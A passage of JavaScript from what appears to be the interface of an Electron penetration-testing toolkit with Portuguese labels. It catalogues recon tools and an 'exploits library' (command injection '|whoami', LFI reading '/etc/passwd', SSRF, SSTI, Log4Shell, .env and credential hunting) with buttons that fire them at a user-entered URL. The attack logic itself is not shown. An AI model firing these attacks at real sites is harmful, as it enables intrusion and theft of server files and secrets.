    mapPin: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>',
    hash: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line></svg>',
    terminal: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>',
    folder: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>',
    key: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path></svg>',
    eye: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>',
    bot: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="10" rx="2"></rect><circle cx="12" cy="5" r="2"></circle><path d="M12 7v4"></path><line x1="8" y1="16" x2="8" y2="16"></line><line x1="16" y1="16" x2="16" y2="16"></line></svg>',
    box: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline><line x1="12" y1="22.08" x2="12" y2="12"></line></svg>',
    message: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>',
    phone: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>',
    wifi: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.55a11 11 0 0 1 14.08 0"></path><path d="M1.42 9a16 16 0 0 1 21.16 0"></path><path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path><line x1="12" y1="20" x2="12.01" y2="20"></line></svg>',
    arrowRight: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>',
    book: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"></path></svg>',
    cookie: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5"></path><path d="M8.5 8.5v.01"></path><path d="M16 15.5v.01"></path><path d="M12 12v.01"></path><path d="M11 17v.01"></path><path d="M7 14v.01"></path></svg>',
    layers: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"></polygon><polyline points="2 12 12 17 22 12"></polyline><polyline points="2 17 12 22 22 17"></polyline></svg>',
    cpu: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="16" height="16" rx="2" ry="2"></rect><rect x="9" y="9" width="6" height="6"></rect><line x1="9" y1="1" x2="9" y2="4"></line><line x1="15" y1="1" x2="15" y2="4"></line><line x1="9" y1="20" x2="9" y2="23"></line><line x1="15" y1="20" x2="15" y2="23"></line><line x1="20" y1="9" x2="23" y2="9"></line><line x1="20" y1="14" x2="23" y2="14"></line><line x1="1" y1="9" x2="4" y2="9"></line><line x1="1" y1="14" x2="4" y2="14"></line></svg>'
};

// ═══════════ Tools Library (50+) ═══════════
const TOOLS_DATABASE = [
    { id: 'osint_whois', name: 'Whois Lookup', cat: 'OSINT', icon: ICONS.search, desc: 'Informações de registro de domínio.' },
    { id: 'osint_dns', name: 'DNS Lookup', cat: 'OSINT', icon: ICONS.globe, desc: 'Registros A, MX, TXT, NS.' },
    { id: 'osint_sub', name: 'Subdomain Finder', cat: 'OSINT', icon: ICONS.layers, desc: 'Busca subdomínios ativos.' },
    { id: 'osint_email', name: 'Email Scraper', cat: 'OSINT', icon: ICONS.mail, desc: 'Extrai emails de páginas públicas.' },
    { id: 'osint_social', name: 'Social Recon', cat: 'OSINT', icon: ICONS.users, desc: 'Busca perfis vinculados ao alvo.' },
    { id: 'osint_shodan', name: 'Shodan Scan', cat: 'OSINT', icon: ICONS.eye, desc: 'Busca dispositivos expostos.' },
    { id: 'osint_wayback', name: 'Wayback Machine', cat: 'OSINT', icon: ICONS.book, desc: 'Histórico de versões do site.' },
    { id: 'osint_dorks', name: 'Google Dorks', cat: 'OSINT', icon: ICONS.search, desc: 'Busca avançada por vulnerabilidades.' },
    { id: 'web_headers', name: 'Header Audit', cat: 'Web', icon: ICONS.shield, desc: 'Verifica headers de segurança.' },
    { id: 'web_cookies', name: 'Cookie Audit', cat: 'Web', icon: ICONS.cookie, desc: 'Analisa flags Secure e HttpOnly.' },
    { id: 'web_tech', name: 'Tech Stack', cat: 'Web', icon: ICONS.cpu, desc: 'Identifica frameworks e bibliotecas.' },
    { id: 'web_cms', name: 'CMS Detector', cat: 'Web', icon: ICONS.box, desc: 'Detecta WordPress, Joomla, etc.' },
    { id: 'web_waf', name: 'WAF Checker', cat: 'Web', icon: ICONS.shieldAlert, desc: 'Detecta Cloudflare, Akamai, etc.' },
    { id: 'web_robots', name: 'Robots.txt', cat: 'Web', icon: ICONS.bot, desc: 'Analisa regras de indexação.' },
    { id: 'web_sitemap', name: 'Sitemap Parser', cat: 'Web', icon: ICONS.mapPin, desc: 'Mapeia a estrutura do site.' },
    { id: 'web_ssl', name: 'SSL Audit', cat: 'Web', icon: ICONS.lock, desc: 'Verifica validade e força do cert.' },
    { id: 'sec_cors', name: 'CORS Check', cat: 'Security', icon: ICONS.link, desc: 'Verifica políticas de origem.' },
    { id: 'sec_csp', name: 'CSP Audit', cat: 'Security', icon: ICONS.shield, desc: 'Analisa Content Security Policy.' },
    { id: 'sec_click', name: 'Clickjacking', cat: 'Security', icon: ICONS.eye, desc: 'Testa proteção X-Frame-Options.' },
    { id: 'sec_hsts', name: 'HSTS Check', cat: 'Security', icon: ICONS.shieldAlert, desc: 'Verifica Strict Transport Security.' },
    { id: 'sec_xss', name: 'XSS Light', cat: 'Security', icon: ICONS.shieldAlert, desc: 'Scan superficial de XSS refletido.' },
    { id: 'sec_sqli', name: 'SQLi Light', cat: 'Security', icon: ICONS.database, desc: 'Busca erros de DB em parâmetros.' },
    { id: 'sec_redirect', name: 'Open Redirect', cat: 'Security', icon: ICONS.arrowRight, desc: 'Testa redirecionamentos inseguros.' },
    { id: 'net_ports', name: 'Port Scan', cat: 'Network', icon: ICONS.server, desc: 'Scan de portas comuns (80, 443, 21).' },
    { id: 'net_ping', name: 'Ping Test', cat: 'Network', icon: ICONS.wifi, desc: 'Verifica latência e presença.' },
    { id: 'net_trace', name: 'Traceroute', cat: 'Network', icon: ICONS.activity, desc: 'Mapeia os saltos até o host.' },
    { id: 'net_geo', name: 'IP Geo', cat: 'Network', icon: ICONS.mapPin, desc: 'Localização geográfica do IP.' },
    { id: 'net_asn', name: 'ASN Lookup', cat: 'Network', icon: ICONS.server, desc: 'Informações do provedor (ISP).' },
    { id: 'file_sourcemap', name: 'Source Maps', cat: 'Leaks', icon: ICONS.mapPin, desc: 'Busca arquivos .map expostos.' },
    { id: 'file_git', name: '.git Leak', cat: 'Leaks', icon: ICONS.folder, desc: 'Verifica exposição de repositórios.' },
    { id: 'file_env', name: '.env Finder', cat: 'Leaks', icon: ICONS.key, desc: 'Busca chaves em arquivos de config.' },
    { id: 'file_backup', name: 'Backups', cat: 'Leaks', icon: ICONS.database, desc: 'Busca arquivos .zip, .sql, .bak.' },
    { id: 'file_dir', name: 'Dir Listing', cat: 'Leaks', icon: ICONS.folder, desc: 'Verifica diretórios abertos.' },
    { id: 'data_b64', name: 'Base64 Tool', cat: 'Utils', icon: '64', desc: 'Encode/Decode Base64.' },
    { id: 'data_url', name: 'URL Tool', cat: 'Utils', icon: ICONS.link, desc: 'Encode/Decode URL strings.' },
    { id: 'data_hash', name: 'Hash Ident', cat: 'Utils', icon: ICONS.hash, desc: 'Identifica tipo de hash (MD5, SHA).' },
    { id: 'data_pass', name: 'Pass Check', cat: 'Utils', icon: ICONS.shield, desc: 'Calcula força de senhas.' },
    { id: 'data_jwt', name: 'JWT Debug', cat: 'Utils', icon: ICONS.code, desc: 'Analisa tokens JWT.' },
    { id: 'app_deeplink', name: 'DeepLink Check', cat: 'App', icon: ICONS.smartphone, desc: 'Busca esquemas customizados.' },
    { id: 'app_manifest', name: 'Manifest Audit', cat: 'App', icon: ICONS.file, desc: 'Analisa PWA Manifest.' },
    { id: 'adv_headers_inj', name: 'Header Inj', cat: 'Advanced', icon: ICONS.shieldAlert, desc: 'Testa injeção de headers.' },
    { id: 'adv_params', name: 'Param Miner', cat: 'Advanced', icon: ICONS.hash, desc: 'Busca parâmetros ocultos.' },
    { id: 'adv_vuln', name: 'Vuln DB', cat: 'Advanced', icon: ICONS.book, desc: 'Consulta CVEs conhecidas.' },
    { id: 'net_whois_ip', name: 'IP Whois', cat: 'Network', icon: ICONS.search, desc: 'Dono e range do endereço IP.' },
    { id: 'osint_metadata', name: 'Metadata Ext', cat: 'OSINT', icon: ICONS.file, desc: 'Extrai metadados de imagens/docs.' },
    { id: 'osint_breach', name: 'Breach Check', cat: 'OSINT', icon: ICONS.unlock, desc: 'Verifica se o alvo está em vazamentos.' },
    { id: 'web_load_test', name: 'Load Stress', cat: 'Performance', icon: ICONS.activity, desc: 'Simula carga leve no servidor.' },
    { id: 'web_api_fuzz', name: 'API Fuzzing', cat: 'Advanced', icon: ICONS.server, desc: 'Busca endpoints via dicionário.' },
    { id: 'sec_headers_sec', name: 'Security Headers +', cat: 'Security', icon: ICONS.shield, desc: 'Sugestões de configuração proativa.' },
    { id: 'data_jwt_crack', name: 'JWT Weak Secret', cat: 'Utils', icon: ICONS.unlock, desc: 'Testa secrets fracos em tokens.' },
    { id: 'osint_intel', name: 'Threat Intel', cat: 'OSINT', icon: ICONS.eye, desc: 'Busca reputação em listas de bloqueio.' }
];

// ═══════════ Exploits Library (20+) ═══════════
const EXPLOITS_DATABASE = [
    { id: 'sec_rce', name: 'Command Injection', cat: 'RCE', icon: ICONS.terminal, desc: 'Testa execução remota de código (|whoami).' },
    { id: 'sec_lfi', name: 'Local File Inclusion', cat: 'LFI', icon: ICONS.folder, desc: 'Lê arquivos críticos do servidor (/etc/passwd).' },
    { id: 'sec_ssrf', name: 'SSRF Attack', cat: 'SSRF', icon: ICONS.globe, desc: 'Falsificação de requisição do lado do servidor.' },
    { id: 'sec_redirect', name: 'Open Redirect', cat: 'Bypass', icon: ICONS.arrowRight, desc: 'Redirecionamento aberto e phishing.' },
    { id: 'adv_crlf', name: 'CRLF Injection', cat: 'Injection', icon: ICONS.code, desc: 'HTTP Response Splitting (%0d%0a).' },
    { id: 'adv_ssti', name: 'SSTI Exploit', cat: 'RCE', icon: ICONS.cpu, desc: 'Server-Side Template Injection ({{7*7}}).' },
    { id: 'adv_nosqli', name: 'NoSQLi Auth Bypass', cat: 'Injection', icon: ICONS.database, desc: 'Bypass sintático em MongoDB/CouchDB.' },
    { id: 'adv_xxe', name: 'XXE Out-of-band', cat: 'Injection', icon: ICONS.code, desc: 'XML External Entity reading.' },
    { id: 'adv_ldap', name: 'LDAP Injection', cat: 'Bypass', icon: ICONS.users, desc: 'Bypass em autenticações Active Directory.' },
    { id: 'adv_xpath', name: 'XPath Injection', cat: 'Injection', icon: ICONS.layers, desc: 'Dump de bancos de dados XML.' },
    { id: 'exp_ssi', name: 'SSI Injection', cat: 'RCE', icon: ICONS.terminal, desc: 'Server-Side Includes Execution.' },
    { id: 'exp_cache', name: 'Cache Poisoning', cat: 'Bypass', icon: ICONS.box, desc: 'Envenenamento de cache não-chavado.' },
    { id: 'exp_host', name: 'Host Header Attack', cat: 'Bypass', icon: ICONS.shieldAlert, desc: 'Password reset poisoning via Host.' },
    { id: 'exp_webdav', name: 'WebDAV Put', cat: 'Upload', icon: ICONS.file, desc: 'Tenta upload via métodos PROPFIND/PUT.' },
    { id: 'exp_bola', name: 'BOLA / IDOR', cat: 'Auth', icon: ICONS.unlock, desc: 'Broken Object Level Authorization test.' },
    { id: 'exp_deser', name: 'Deserialization', cat: 'RCE', icon: ICONS.cpu, desc: 'Envio de Magic Bytes e objetos Java/PHP.' },
    { id: 'exp_graphql', name: 'GraphQL Leak', cat: 'Leak', icon: ICONS.database, desc: 'Introspection query para vazar schema.' },
    { id: 'exp_actuator', name: 'Spring Actuator', cat: 'Leak', icon: ICONS.box, desc: 'Vazamento de /env e /heapdump.' },
    { id: 'exp_dotenv', name: 'Env Traversal', cat: 'Leak', icon: ICONS.key, desc: 'Busca cega por /.env e config files.' },
    { id: 'exp_cors', name: 'CORS Exploit', cat: 'Bypass', icon: ICONS.link, desc: 'Teste de Null Origin e reflection.' },
    { id: 'exp_click', name: 'Clickjacking', cat: 'UI', icon: ICONS.eye, desc: 'Teste de iFraming overlay (X-Frame bypass).' },
    { id: 'exp_log4j', name: 'Log4Shell', cat: 'RCE', icon: ICONS.terminal, desc: 'Injeção via JNDI/LDAP lookup base.' },
    { id: 'exp_xst', name: 'XST (TRACE)', cat: 'Injection', icon: ICONS.arrowRight, desc: 'Cross-Site Tracing via HTTP TRACE.' }
];

function renderTools(filter = '') {
    const grid = document.getElementById('tools-grid');
    if (!grid) return;
    grid.innerHTML = '';
    const filtered = TOOLS_DATABASE.filter(t => 
        t.name.toLowerCase().includes(filter.toLowerCase()) || 
        t.cat.toLowerCase().includes(filter.toLowerCase())
    );
    filtered.forEach(tool => {
        const card = document.createElement('div');
        card.className = 'card';
        card.style.padding = '12px';
        card.style.background = 'rgba(255,255,255,0.02)';
        card.style.backdropFilter = 'blur(10px)';
        card.style.border = '1px solid rgba(255,255,255,0.05)';
        card.style.transition = 'all 0.3s cubic-bezier(0.4, 0, 0.2, 1)';
        card.innerHTML = `
            <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
                <div style="font-size: 20px; opacity: 0.9;">${tool.icon}</div>
                <span style="font-weight: 600; font-size: 12px; letter-spacing: -0.01em;">${tool.name}</span>
            </div>
            <div style="font-size: 10px; color: var(--text-3); height: 28px; line-height: 1.4; overflow: hidden; opacity: 0.8;">${tool.desc}</div>
            <div style="margin-top: 12px; display: flex; justify-content: space-between; align-items: center;">
                <span class="tag tag-blue" style="font-size: 8px; padding: 2px 8px; border-radius: 100px;">${tool.cat}</span>
                <button class="btn btn-ghost" style="padding: 4px 10px; font-size: 10px; height: auto; border-radius: 100px; background: rgba(59,130,246,0.1); border-color: transparent; color: var(--accent);">Executar</button>
            </div>
        `;
        card.onmouseenter = () => {
            card.style.background = 'rgba(255,255,255,0.05)';
            card.style.borderColor = 'rgba(59,130,246,0.3)';
            card.style.transform = 'translateY(-2px)';
        };
        card.onmouseleave = () => {
            card.style.background = 'rgba(255,255,255,0.02)';
            card.style.borderColor = 'rgba(255,255,255,0.05)';
            card.style.transform = 'translateY(0)';
        };
        card.onclick = () => runTool(tool.id, tool.name, false);
        grid.appendChild(card);
    });
}

function renderExploits(filter = '') {
    const grid = document.getElementById('exploits-grid');
    if (!grid) return;
    grid.innerHTML = '';
    const filtered = EXPLOITS_DATABASE.filter(e => 
        e.name.toLowerCase().includes(filter.toLowerCase()) || 
        e.cat.toLowerCase().includes(filter.toLowerCase())
    );
    filtered.forEach(exp => {
        const card = document.createElement('div');
        card.className = 'card';
        card.style.padding = '12px';
        card.style.background = 'rgba(239,68,68,0.02)';
        card.style.backdropFilter = 'blur(10px)';
        card.style.border = '1px solid rgba(239,68,68,0.1)';
        card.style.transition = 'all 0.3s cubic-bezier(0.4, 0, 0.2, 1)';
        card.innerHTML = `
            <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
                <div style="font-size: 20px; color: var(--red); opacity: 0.9;">${exp.icon}</div>
                <span style="font-weight: 600; font-size: 12px; color: var(--text-1); letter-spacing: -0.01em;">${exp.name}</span>
            </div>
            <div style="font-size: 10px; color: var(--text-3); height: 28px; line-height: 1.4; overflow: hidden; opacity: 0.8;">${exp.desc}</div>
            <div style="margin-top: 12px; display: flex; justify-content: space-between; align-items: center;">
                <span class="tag tag-red" style="font-size: 8px; padding: 2px 8px; border-radius: 100px;">${exp.cat}</span>
                <button class="btn btn-ghost" style="padding: 4px 10px; font-size: 10px; height: auto; border-radius: 100px; background: rgba(239,68,68,0.1); border-color: transparent; color: var(--red);">Disparar</button>
            </div>
        `;
        card.onmouseenter = () => {
            card.style.background = 'rgba(239,68,68,0.06)';
            card.style.borderColor = 'rgba(239,68,68,0.4)';
            card.style.transform = 'translateY(-2px)';
        };
        card.onmouseleave = () => {
            card.style.background = 'rgba(239,68,68,0.02)';
            card.style.borderColor = 'rgba(239,68,68,0.1)';
            card.style.transform = 'translateY(0)';
        };
        card.onclick = () => runTool(exp.id, exp.name, true);
        grid.appendChild(card);
    });
}

let activeToolCalls = 0;
let activeExploitCalls = 0;

async function runTool(id, name, isExploit = false) {
    let url = '';
    if (isExploit) {
        url = document.getElementById('exploit-target')?.value || document.getElementById('scan-target').value;
    } else {
        url = document.getElementById('tool-target')?.value || document.getElementById('scan-target').value;
    }
    
    if (!url && !id.startsWith('data_')) {
        alert('Por favor, digite o URL Alvo antes de executar esta ferramenta.');
        return;
    }

    const toolMeta = isExploit ? EXPLOITS_DATABASE.find(t => t.id === id) : TOOLS_DATABASE.find(t => t.id === id) || { name: id, cat: 'Misc', icon: ICONS.activity };
    term.writeln(`\r\n\x1b[33m[exec]\x1b[0m Iniciando ${isExploit ? 'exploit' : 'ferramenta'}: ${toolMeta.name} em ${url || 'buffer'}`);
    
    if (window.SoundEngine) window.SoundEngine.play('scan');
    
    // Switch to results tab automatically
    if (isExploit) {
        showSubPaneExploits('tab-exploits-results');
    } else {
        showToolsPane('tab-tools-results');
    }
    
    const resultsPane = document.getElementById(isExploit ? 'pane-exploits-results' : 'pane-tools-results');
    const badge = document.getElementById(isExploit ? 'exploits-badge' : 'tools-badge');
    
    if (isExploit) {
        activeExploitCalls++;
        badge.textContent = activeExploitCalls;
    } else {
        activeToolCalls++;
        badge.textContent = activeToolCalls;
    }
    
    if ((isExploit && activeExploitCalls === 1) || (!isExploit && activeToolCalls === 1)) {
        resultsPane.innerHTML = '';
    }

    // Create Result Card
    const resultCard = document.createElement('div');
    resultCard.className = 'card';
    resultCard.style.position = 'relative';
    resultCard.style.animation = 'fade-in 0.3s ease';
    
    const timestamp = new Date().toLocaleTimeString();
    
    resultCard.innerHTML = `
        <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 15px;">
            <div style="display: flex; gap: 10px; align-items: center;">
                <div style="font-size: 24px; background: var(--surface-2); border-radius: 8px; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; border: 1px solid var(--border-1);">
                    <span style="${isExploit ? 'color: var(--red);' : ''}">${toolMeta.icon}</span>
                </div>
                <div>
                    <div style="font-weight: 600; font-size: 14px; color: ${isExploit ? 'var(--red)' : 'var(--text-1)'};">${toolMeta.name}</div>
                    <div style="font-size: 10px; color: var(--text-3); font-family: var(--mono);">Alvo: ${url || 'Local'} • ${timestamp}</div>
                </div>
            </div>
            <span class="tag ${isExploit ? 'tag-red' : 'tag-blue'}" style="animation: critical-pulse 1.5s infinite;">Processando...</span>
        </div>
        <div class="data-well" style="max-height: none; min-height: 80px; display: flex; align-items: center; justify-content: center; border: 1px dashed var(--border-1);">
            <span style="color: var(--text-3); font-size: 11px; font-family: var(--mono);">Executando módulo físico...</span>
        </div>
        <div class="result-actions" style="display: none; margin-top: 15px; border-top: 1px solid var(--border-1); padding-top: 10px;">
            <div style="display: flex; gap: 10px;">
                <button class="btn btn-ghost btn-dl-txt" style="flex: 1;">Baixar TXT</button>
                <button class="btn btn-ghost btn-dl-json" style="flex: 1;">Baixar JSON</button>
                <button class="btn btn-primary btn-dl-pdf" style="flex: 1; border-radius: 8px; font-weight: 600;">Relatório PDF</button>
            </div>
        </div>
    `;

    // Add to top of the list
    resultsPane.insertBefore(resultCard, resultsPane.firstChild);

    const statusBadge = resultCard.querySelector('.tag');

    // EXECUÇÃO REAL VIA MOTOR UNIFICADO
    if (window.electronAPI && window.electronAPI.runTool) {
        const type = isExploit ? 'exploits' : 'tools';
        let payload = '';
        if (isExploit) {
            const customPayload = document.getElementById('exploit-custom-payload')?.value;
            if (customPayload && customPayload.trim() !== "") {
                payload = customPayload;
                term.writeln(`\x1b[31m[!] Payload Ativo:\x1b[0m ${customPayload}`);
            }
        }

        try {
            const res = await window.electronAPI.runTool(id, url);
            
            statusBadge.className = res.success ? 'tag tag-green' : 'tag tag-red';
            statusBadge.innerText = res.success ? 'Sucesso' : 'Falhou';
            
            if (window.SoundEngine) window.SoundEngine.play(res.success ? 'success' : 'error');
            
            term.writeln(res.success ? `\x1b[32m[ok]\x1b[0m ${toolMeta.name} finalizado.` : `\x1b[31m[erro]\x1b[0m Falha ao executar ${toolMeta.name}`);
            term.prompt();

            const well = resultCard.querySelector('.data-well');
            well.style.display = 'block';
            well.style.border = res.success ? '1px solid var(--border-1)' : '1px dashed var(--red)';
            well.innerHTML = '';
            
            const pre = document.createElement('pre');
            pre.style.margin = '0';
            pre.style.fontFamily = 'var(--mono)';
            pre.style.fontSize = '10px';
            pre.style.color = res.success ? 'var(--green)' : 'var(--text-1)';
            pre.style.whiteSpace = 'pre-wrap';
            pre.style.wordBreak = 'break-word';
            pre.innerText = res.message;
            
            well.appendChild(pre);

            const actions = resultCard.querySelector('.result-actions');
            actions.style.display = 'block';
            actions.querySelector('.btn-dl-txt').onclick = () => {
                downloadData(`${toolMeta.name.replace(/\s+/g, '_')}_${Date.now()}.txt`, pre.innerText);
            };
            actions.querySelector('.btn-dl-pdf').onclick = async () => {
                if (!window.electronAPI || !window.electronAPI.exportReportPDF) {
                    alert('Exportação PDF não está disponível no preload.js.');
                    return;
                }
                
                try {
                    const btn = actions.querySelector('.btn-dl-pdf');
                    const oldText = btn.innerText;
                    btn.innerText = 'Gerando...';
                    btn.disabled = true;
                    
                    const dataObj = {
                        url: url || 'Local/Sistema',
                        date: new Date().toLocaleString(),
                        moduleName: toolMeta.name,
                        status: res.success ? 'Concluído com Sucesso' : 'Falha',
                        rawLog: pre.innerText.replace(/</g, '&lt;').replace(/>/g, '&gt;')
                    };
                    
                    // Heurística simples para RISK_GRADE baseada no output ou tool type
                    const output = pre.innerText.toLowerCase();
                    let riskGrade = 'C'; let riskClass = 'grade-C';
                    if (isExploit) { riskGrade = 'F'; riskClass = 'grade-F'; }
                    else if (output.includes('vulnerable') || output.includes('exposed')) { riskGrade = 'F'; riskClass = 'grade-F'; }
                    else if (output.includes('secure') || output.includes('protected')) { riskGrade = 'A'; riskClass = 'grade-A'; }
                    
                    dataObj.riskGrade = riskGrade;
                    dataObj.riskClass = riskClass;
                    
                    const result = await window.electronAPI.exportReportPDF(dataObj);
                    if (result.success && window.SoundEngine) window.SoundEngine.play('success');
                    
                    btn.innerText = oldText;
                    btn.disabled = false;
                } catch (e) {
                    console.error(e);
                    alert('Erro ao gerar PDF: ' + e.message);
                }
            };
            
            if (res.success && window.addXP) {
                window.addXP(isExploit ? 45 : 15, isExploit ? 'Auditoria Concluída' : 'Uso de Ferramenta');
            }
        } catch (err) {
            statusBadge.style.animation = 'none';
            statusBadge.className = 'tag tag-red';
            statusBadge.innerText = 'Falhou';

            if (window.SoundEngine) window.SoundEngine.play('error');

            const well = resultCard.querySelector('.data-well');
            well.style.display = 'block';
            well.style.border = '1px dashed var(--red)';
            well.innerHTML = `<span style="color: var(--red); font-size: 11px; font-family: var(--mono);">${err.message}</span>`;
            
            term.writeln(`\x1b[31m[erro]\x1b[0m Falha ao executar ${toolMeta.name}: ${err.message}`);
            term.prompt();
        }
        return;
    }
}

function syntaxHighlightJSON(json) {
    json = json.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    return json.replace(/("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)/g, function (match) {
        let cls = 'color: var(--blue);'; // number
        if (/^"/.test(match)) {
            if (/:$/.test(match)) {
                cls = 'color: var(--text-2); font-weight: 600;'; // key
            } else {
                cls = 'color: var(--green);'; // string
            }
        } else if (/true|false/.test(match)) {
            cls = 'color: var(--amber);'; // boolean
        } else if (/null/.test(match)) {
            cls = 'color: var(--red);'; // null
        }
        return '<span style="' + cls + '">' + match + '</span>';
    });
}

document.getElementById('tool-search')?.addEventListener('input', (e) => renderTools(e.target.value));
document.getElementById('exploit-search')?.addEventListener('input', (e) => renderExploits(e.target.value));
renderTools();
renderExploits();

// ═══════════ Vault & Dashboard ═══════════
const vaultResults = document.getElementById('vault-results');
const row = (k, v, cls = '') => `<div class="row"><span class="row-k">${k}</span><span class="row-v ${cls}">${v}</span></div>`;

const MODULE_META = {
    architecture:       { label: 'Arquitetura',           icon: ICONS.server, color: 'blue' },
    harvested_data:     { label: 'Dados Extraídos',       icon: ICONS.unlock, color: 'red' },
    security_headers:   { label: 'Headers de Segurança',  icon: ICONS.shield, color: 'green' },
    cookies:            { label: 'Cookies',               icon: ICONS.cookie, color: 'amber' },
    tech_stack:         { label: 'Tech Stack',            icon: ICONS.cpu, color: 'blue' },
    cms:                { label: 'CMS',                   icon: ICONS.box, color: 'blue' },
    cdn_waf:            { label: 'CDN / WAF',             icon: ICONS.shieldAlert, color: 'blue' },
    ssl_cert:           { label: 'Certificado SSL',       icon: ICONS.lock, color: 'green' },
    robots_txt:         { label: 'Robots.txt',            icon: ICONS.bot, color: 'amber' },
    sitemap:            { label: 'Sitemap',               icon: ICONS.mapPin, color: 'blue' },
    cors:               { label: 'Política CORS',         icon: ICONS.link, color: 'red' },
    http_methods:       { label: 'Métodos HTTP',          icon: ICONS.activity, color: 'blue' },
    html_comments:      { label: 'Comentários HTML',      icon: ICONS.message, color: 'gray' },
    hidden_inputs:      { label: 'Inputs Ocultos',        icon: ICONS.eye, color: 'amber' },
    external_services:  { label: 'Serviços Externos',     icon: ICONS.users, color: 'amber' },
    social_links:       { label: 'Redes Sociais',         icon: ICONS.link, color: 'blue' },
    phone_numbers:      { label: 'Telefones',             icon: ICONS.phone, color: 'green' },
    assets:             { label: 'Assets',                icon: ICONS.file, color: 'blue' },
    api_endpoints:      { label: 'APIs Descobertas',      icon: ICONS.server, color: 'red' },
